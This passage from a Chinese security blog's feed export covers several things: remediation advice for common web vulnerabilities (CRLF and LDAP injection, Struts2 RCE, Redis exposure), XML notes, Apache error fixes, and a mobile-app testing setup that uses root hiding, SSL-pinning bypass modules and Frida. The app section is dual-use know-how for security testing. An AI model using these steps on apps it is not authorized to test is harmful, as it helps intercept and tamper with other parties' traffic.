<p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接
　　</p>
<h1 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h1><h2 id="漏洞描述-16"><a href="#漏洞描述-16" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
<h2 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。
　　</p>
<h1 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h1><h2 id="漏洞描述-17"><a href="#漏洞描述-17" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
<h2 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　对用户的输入内容进行严格的过滤。
　　
　　</p>
<h1 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h1><h2 id="漏洞描述-18"><a href="#漏洞描述-18" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
<h2 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
<p>　　2、白名单规定跳转链接
　　</p>
<h1 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h1><h2 id="漏洞描述-19"><a href="#漏洞描述-19" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
<h2 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
<p>　　2、使用https来保证传输的安全。
　　</p>
<h1 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h1><h2 id="漏洞描述-20"><a href="#漏洞描述-20" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
<h2 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
<p>　　2、发现并及时修复已存在的漏洞。</p>
<p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门
　　</p>
<h1 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h1><h2 id="漏洞描述-21"><a href="#漏洞描述-21" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
<h2 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
<p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。
　　</p>
<h1 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h1><h2 id="漏洞描述-22"><a href="#漏洞描述-22" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
<h2 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>
<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。
　　</p>
<h1 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h1><h2 id="漏洞描述-23"><a href="#漏洞描述-23" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p>
<h2 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。
　　</p>
<h1 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h1><h2 id="漏洞描述-24"><a href="#漏洞描述-24" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
<h2 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、删除phpinfo 函数。</p>
<p>　　2、若文件无用可直接删除。 
　　</p>
<h1 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h1><h2 id="漏洞描述-25"><a href="#漏洞描述-25" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p>
<p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
<h2 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　修改Windows配置，关闭短文件名功能。</p>
<p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
<p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
<p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
<p>　　3）升级net framework 至4.0以上版本。</p>
<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a class="link" href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。<i class="fas fa-external-link-alt"></i></a>
　　</p>
<h1 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h1><h2 id="漏洞描述-26"><a href="#漏洞描述-26" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
<h2 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、自定义错误页面或使用统一的错误页面提示。
　　</p>
<h1 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h1><h2 id="漏洞描述-27"><a href="#漏洞描述-27" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
<h2 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、删除样例文件</p>
<p>　　2、限制文件访问权限
　　</p>
<h1 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h1><h2 id="漏洞描述-28"><a href="#漏洞描述-28" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
<h2 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。
　　</p>
<h1 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h1><h2 id="漏洞描述-29"><a href="#漏洞描述-29" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
<h2 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p>
<p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。
　　</p>
<h1 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h1><h2 id="漏洞描述-30"><a href="#漏洞描述-30" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
<h2 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p>
<p>　　2、限制uddiexplorer应用只能内网访问
　　</p>
<h1 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h1><h2 id="漏洞描述-31"><a href="#漏洞描述-31" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
<h2 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
<p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;
　　</p>
<h1 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h1><h2 id="漏洞描述-32"><a href="#漏洞描述-32" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
<h2 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　建议用户到官方获取最新补丁或者最新版本程序。
　　</p>
<h1 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h1><h2 id="漏洞描述-33"><a href="#漏洞描述-33" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<h2 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。
　　</p>
<h1 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h1><h2 id="漏洞描述-34"><a href="#漏洞描述-34" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
<h2 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
<p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<p>　　4、修改WEB-INF/classes目录下的配置</p>
<p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p>
<p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p>
<p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p>
<p>　　struts.messages.upload.error.InvalidContentTypeException=1
　　</p>
<h1 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h1><h2 id="漏洞描述-35"><a href="#漏洞描述-35" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
<h2 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h2><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。
　　</p>
<h1 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h1><h2 id="漏洞描述-36"><a href="#漏洞描述-36" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p>
<h2 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.禁用一些高危命令</p>
<p>　　常见如：flushdb，flushall，config，keys 等</p>
<p>2.以低权限运行 Redis 服务</p>
<p>3.为 Redis 添加密码验证</p>
<p>4.禁止外网访问 Redis</p>
<p>5.保证 authorized_keys 文件的安全</p>
]]></content>
  </entry>
  <entry>
    <title>XML笔记</title>
    <url>/2021/01/17/XML%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14260160.html">源地址：https://www.cnblogs.com/This-is-Y/p/14260160.html<i class="fas fa-external-link-alt"></i></a></p>
<p>XML全称为（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）可扩展标记语言</p>
<h2 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h2><p>XML 不是 HTML 的替代。</p>
<p>XML比HTML语法严格得多</p>
<p>XML 和 HTML 为不同的目的而设计：</p>
<ul>
<li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li>
<li>HTML 被设计用来显示数据，其焦点是数据的外观。</li>
</ul>
<p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
<p> </p>
<p>XML需要关闭标签，于HTML相比较为严格</p>
<p>XML标签对大小写敏感</p>
<p>XML属性值必须加引号，单双皆可</p>
<p>　　属性值用双引号 “ 或单引号 ‘ 分隔，如果属性值中有单引号，则用双引号分隔；如果有双引号，则用单引号分隔。那么如果属性值中既有单引号还有双引号怎么办？这种要使用实体👇👇👇</p>
<p>XML中下面五个字符建议使用实体引用<br>|&amp;lt;|&lt;|less than<br>|&amp;gt;|&gt;|greater than<br>|&amp;amp;|&amp;|ampersand<br>|&amp;apos;|’|apostrophe</p>
<td style="text-align: left">&amp;quot;</td><td style="text-align: left">"</td><td style="text-align: left">quotation mark</td>

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>这样会出错</p>
<p>应该使用实体引用</p>
<p>（在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。）</p>
<p>XML的注释与HTMl相似 &lt;!– 内容 –&gt;</p>
<p>XML中，空格会被保留，不像HTML中会合并成一个</p>
<p> </p>
<p>XML元素命名与其他编程语言无异</p>
<p>　　由数字字母字符组成</p>
<p>　　不能以数字或标点符号开始</p>
<p>　　不能以字母XML，xml这样子的开始</p>
<p>　　不能包含空格</p>
<p>　　命名中不能出现”-“,”.”,”:”。会产生歧义</p>
<p>　　</p>
<p>DTD全称是The document type definition，即是文档类型定义。</p>
<p>拥有正确语法的 XML 被称为”形式良好”的 XML。</p>
<p>通过 DTD 验证的XML是”合法”的 XML。</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>1</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>apache部分报错解决方法</title>
    <url>/2019/07/26/apache%E9%83%A8%E5%88%86%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11251421.html">源地址：https://www.cnblogs.com/This-is-Y/p/11251421.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>AH00558：</strong></p>
<img src="1503868-20190726161615866-941150129.png" alt>

<p>进入apache文件夹下的conf文件夹，打开httpd.conf文件，用ctrl+F找到ServerName，如下图<img src="1503868-20190726161750794-745672727.png" alt></p>
<p>在下面加上一句：</p>
<p>ServerName domain_name:80</p>
<p>或</p>
<p>ServerName localhost:80</p>
<p>如图：</p>
<img src="1503868-20190726161542420-942882834.png" alt>

<p> 之后启动apache服务，httpd -k start</p>
<p> </p>
<p> </p>
<h1 id="AH00451："><a href="#AH00451：" class="headerlink" title="AH00451："></a>AH00451：</h1><p>原因：由于安装了虚拟机VMWare，被占用443端口</p>
<p><br>解决方法：<br>打开虚拟机VMware，打开菜单 编辑→首选项（Edit–&gt; Preferences）<br>点击共享虚拟机后，找到右边的更改设置，点击它<br>在端口号处，输入444，点击确定，等待一会，大功告成</p>
<p>如图<img src="1503868-20190726162307639-454184241.png" alt width="1257" height="707"></p>
<p> </p>
<p>** AH00091：**</p>
<p><strong><img src="1503868-20190726162608683-819523876.png" alt></strong></p>
<p> </p>
<p><strong>AH00015：</strong></p>
<p> <img src="1503868-20190726162713731-1849500162.png" alt></p>
<p> </p>
<p>这两个放一起解决，如果端口没问题的话，那就用管理员打开cmd，执行httpd -k start</p>
<p> </p>
<p>暂时写到这里，我出现的问题就这么多，后续再更新</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>app 杂项笔记</title>
    <url>/2023/04/09/app-%E6%9D%82%E9%A1%B9%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>记录一下折腾app的一些过程与奇奇怪怪的问题</p>
<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><ul>
<li><p>小米6一台（已root）</p>
<ul>
<li>termux(0.118.0)</li>
</ul>
</li>
<li><p>adb(1.0.36(nox夜神模拟器里的))</p>
</li>
<li><p>magisk 版本25.2(25200)</p>
<ul>
<li>模块（启动Zygisk）：<ul>
<li>Shamiko(root隐藏)</li>
<li>Zygisk-LSPosed(LSPosed)</li>
</ul>
</li>
</ul>
</li>
<li><p>LSPosed(1.8.6(6712)-Zygisk,API版本93)</p>
<ul>
<li>模块<ul>
<li>隐藏应用列表(3.1.1 root隐藏)</li>
<li>JustTrustMe(.2)</li>
<li>SSLUnpinning(1.0.0)</li>
</ul>
</li>
</ul>
</li>
<li><p>Frida (16.0.11)</p>
</li>
<li><p>Objection (1.11.0)</p>
</li>
<li><p>HttpCanary (v3.3.5)</p>
</li>
</ul>
<h1 id="各种安装过程"><a href="#各种安装过程" class="headerlink" title="各种安装过程"></a>各种安装过程</h1><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>咕咕</p>
<h2 id="termux"><a href="#termux" class="headerlink" title="termux"></a>termux</h2><p>安卓下的shell终端。具体可以参考：</p>
<p><a class="link" href="https://www.sqlsec.com/2018/05/termux.html">https://www.sqlsec.com/2018/05/termux.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="面具Magisk"><a href="#面具Magisk" class="headerlink" title="面具Magisk"></a>面具Magisk</h2><p>咕咕</p>
<h3 id="Shamiko"><a href="#Shamiko" class="headerlink" title="Shamiko"></a>Shamiko</h3><p>Shamiko的github地址</p>
<p><a class="link" href="https://github.com/LSPosed/LSPosed.github.io/releases">https://github.com/LSPosed/LSPosed.github.io/releases<i class="fas fa-external-link-alt"></i></a></p>
<p>下载zip，在magisk中导入即可刷入Shamiko模块，重启手机，打开面具右上角设置，打开遵循排除列表选项，再点击配置排除列表。打开排除配置列表后，勾选要隐藏root的应用，<strong>然后关闭排除列表选项</strong>。如果不关闭排除列表选项，那么Shamiko模块就会不工作，隐藏root就会不生效，所以是必须关闭的，首次配置建议重启一次手机，已达到最佳的隐藏效果。</p>
<p>关于新版本magisk隐藏root，可以看：<a class="link" href="https://zhuanlan.zhihu.com/p/506203078">https://zhuanlan.zhihu.com/p/506203078<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Zygisk-LSPosed"><a href="#Zygisk-LSPosed" class="headerlink" title="Zygisk-LSPosed"></a>Zygisk-LSPosed</h3><p>在magisk设置中直接打开即可</p>
<h2 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h2><p>咕咕</p>
<h3 id="隐藏应用列表-3-1-1-root隐藏"><a href="#隐藏应用列表-3-1-1-root隐藏" class="headerlink" title="隐藏应用列表(3.1.1 root隐藏)"></a>隐藏应用列表(3.1.1 root隐藏)</h3><p>直接在LSPosed里面搜索下载就行，需要先加载一下（时间可能比较久）</p>
<p><img src="image-20230409204941305.png" alt="image-20230409204941305"></p>
<h3 id="JustTrustMe-2"><a href="#JustTrustMe-2" class="headerlink" title="JustTrustMe(.2)"></a>JustTrustMe(.2)</h3><p>JustTrustMe需要在github中下载：<a class="link" href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe<i class="fas fa-external-link-alt"></i></a></p>
<p>安装apk即可</p>
<h3 id="SSLUnpinning-1-0-0"><a href="#SSLUnpinning-1-0-0" class="headerlink" title="SSLUnpinning(1.0.0)"></a>SSLUnpinning(1.0.0)</h3><p>同样直接搜索即可</p>
<p><img src="image-20230409205004795.png" alt="image-20230409205004795"></p>
<h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p>安装客户端（win10电脑上的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>

<p>然后 pip list|findstr frida 找到安装的frida版本.</p>
<p><img src="image-20230409213449135.png" alt="image-20230409213449135"></p>
<p>比如我这里是16.0.11。然后就去<a class="link" href="https://github.com/frida/frida/releases%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD%E5%8D%B3%E5%8F%AF">https://github.com/frida/frida/releases找到对应的服务端版本下载即可<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230409213749429.png" alt="image-20230409213749429"></p>
<p><img src="image-20230409213819759.png" alt="image-20230409213819759"></p>
<p>可以使用 adb shell getprop ro.product.cpu.abi 确定手机系统架构</p>
<p><img src="image-20230409213933394.png" alt="image-20230409213933394"></p>
<p>下载解压后，使用adb将frida-server放到手机目录/data/local/，然后修改属性为可执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看设备连接状态</span><br><span class="line">adb devices -l</span><br><span class="line"></span><br><span class="line">#把服务端推送到手机的指定目录（记得先解压再推送）</span><br><span class="line">adb  push  Downloads\frida-server-16.0.11-android-arm64  &#x2F;sdcard&#x2F;</span><br><span class="line"></span><br><span class="line">#进入手机终端，修改文件权限并运行</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"># 获取root权限,移动frida服务端到&#x2F;data&#x2F;local&#x2F;目录下</span><br><span class="line">su</span><br><span class="line">cp &#x2F;sdcard&#x2F;frida-server-16.0.11-android-arm64 &#x2F;data&#x2F;local&#x2F;</span><br><span class="line">cd &#x2F;data&#x2F;local</span><br><span class="line"></span><br><span class="line"># 修改权限</span><br><span class="line">chmod 777 frida-server-16.0.11-android-arm64</span><br><span class="line"></span><br><span class="line"># 后台启动（方便退出shell）</span><br><span class="line">.&#x2F;frida-server-16.0.11-android-arm64 &amp;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230409214543417.png" alt="image-20230409214543417"></p>
<p>随后usb连接电脑与手机输入 frida-ps -Ua</p>
<p>有类似返回即可</p>
<p><img src="image-20230409214633967.png" alt="image-20230409214633967"></p>
<h2 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h2><p>pip install objection即可</p>
